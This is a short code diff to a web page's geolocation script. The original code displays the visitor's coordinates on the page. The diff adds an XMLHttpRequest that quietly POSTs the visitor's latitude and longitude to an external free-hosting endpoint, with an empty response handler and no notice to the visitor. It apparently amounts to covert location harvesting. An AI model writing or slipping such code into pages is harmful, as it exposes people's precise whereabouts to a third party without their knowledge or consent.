@@ -14,6 +14,14 @@ if (navigator.geolocation) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       document.write(`Latitude: ${latitude}, Longitude: ${longitude}`);
+      let xhr2 = new XMLHttpRequest();
+      xhr2.open('POST', 'https://dhandev.infinityfreeapp.com/location.php');
+      xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr2.onload = function() {
+        if (xhr2.status === 200) {
+        }
+      };
+      xhr2.send('latitude=' + latitude + '&longitude=' + longitude );
     },
     // On error callback
     function(error) {
